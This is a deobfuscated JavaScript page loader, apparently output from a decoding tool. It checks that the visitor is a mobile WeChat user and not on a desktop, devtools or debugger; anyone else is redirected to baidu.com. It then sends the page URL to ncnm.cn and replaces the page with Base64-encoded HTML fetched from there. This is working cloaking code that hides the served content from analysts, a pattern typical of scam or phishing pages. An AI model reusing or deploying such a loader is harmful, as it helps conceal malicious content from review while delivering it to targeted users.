//Tue Aug 27 2024 11:33:41 GMT+0000 (Coordinated Universal Time)
//Base:https://github.com/echo094/decode-js
//Modify:https://github.com/smallfawn/decode_action
function error() {
  window.location.href = "https://www.baidu.com";
  throw new Error("error");
}
function host() {
  return "https://ncnm.cn";
}
function checkBrowser() {
  var _0x2c2709 = navigator.userAgent.toLowerCase(),
    _0x4d9df5 = navigator.platform.toLowerCase();
  return _0x4d9df5.indexOf("win") < 0 && _0x4d9df5.indexOf("mac") < 0 && _0x2c2709.indexOf("wxdebugger") < 0 && _0x2c2709.indexOf("wechatdevtools") < 0 && _0x2c2709.indexOf("windowswechat") < 0 && _0x2c2709.indexOf("micromessenger") > 0;
}
!checkBrowser() && error();
function loadPage() {
  var _0x14dfee = new XMLHttpRequest();
  _0x14dfee.open("GET", host() + "/api/info?u=" + Base64.encode(window.location.href), false);
  _0x14dfee.onreadystatechange = function () {
    if (this.status === 200 && this.readyState === 4) {
      document.getElementById("loading").remove();
      var _0x317658 = document.open("text/html", "replace");
      _0x317658.write(Base64.decode(_0x14dfee.responseText.substr(5)));
      _0x317658.close();
    } else {
      if (this.status === 404) {
        error();
      }
    }
  };
  _0x14dfee.send();
}
loadPage();